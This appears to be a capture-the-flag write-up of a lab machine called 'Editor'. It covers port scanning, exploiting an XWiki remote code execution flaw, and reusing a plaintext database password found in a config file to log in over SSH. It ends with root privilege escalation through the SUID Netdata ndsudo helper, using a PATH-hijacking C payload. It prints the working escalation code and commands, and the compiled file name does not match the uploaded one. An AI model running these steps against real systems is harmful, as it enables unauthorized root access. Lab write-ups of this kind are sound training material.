## Intro

![](MediaFiles/Pasted%20image%2020251003182721.png)

Tags: #linux #OSCPpath #WebApp #SpecialPermissionsFiles #unknown-binary #easy

------
# Reconnaissance

## Port scan

### TCP

```bash
nmap -p- --open -n -Pn -sS -vvv --min-rate 5000 10.10.11.80 -oG allPorts
```

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http
```
## TCP Service Version Detection

```shell
nmap -sCV -p22,80,8080 10.10.11.80 -oN targeted
```

```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
# Foothold

## WebApp

Regarding port `8080` by navigating on the webpage, on the bottom of the page i found this:
```bash
XWiki Debian 15 10.8
```

### Vulnerable webapp version
and according to it, i found this CVE: https://github.com/gunzf0x/CVE-2025-24893

### Shell as xwiki

![](MediaFiles/Pasted%20image%2020251109030702.png)

### Filesystem enumeration

Lets search for password related entries on the xml
```shell
cat hibernate.cfg.xml  |grep password
```

```xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```

#### creds obtained
```bash
theEd1t0rTeam99
```

### Shell as oliver

![](MediaFiles/Pasted%20image%2020251003181128.png)
grabbed user flag 

-----
# Privesc

## group membership

```shell
groups
```

```shell
oliver netdata
```

## Files with special permissions

### Unknown binary

lets find directories and files owner by `netdata` group
```shell
find / -group netdata 2>/dev/null
```

```shell
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/var
/opt/netdata/var/log/netdata
...
```

Looking for files with special permissions, a suspicious ndsudo was found
```bash
find / -user root -perm -4000 - print 2>/dev/null
```
found multiple paths like: `/opt/netdata/usr/libexec/netdata/plugins.d/`
The `ndsudo` binary is a helper that allows Netdata to run privileged commands

### Exploiting ndsudo

found this exploit: https://github.com/AzureADTrent/CVE-2024-32019-POC

create the C source file: 
```bash
nano exploit.c
```
paste the poc:
```C
#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```
next compile it on our machine since target does not have gcc
```bash
gcc exploit.c -o exploit
```
then upload the binary on the tmp dir
```bash
scp nvme oliver@editor.htb:/tmp/
```

## Shell as root

inside the target:
```bash
chmod +x /tmp/nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

```shell
root@editor:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root)
```
![](MediaFiles/Pasted%20image%2020251003180740.png)
grabbed root flag

------


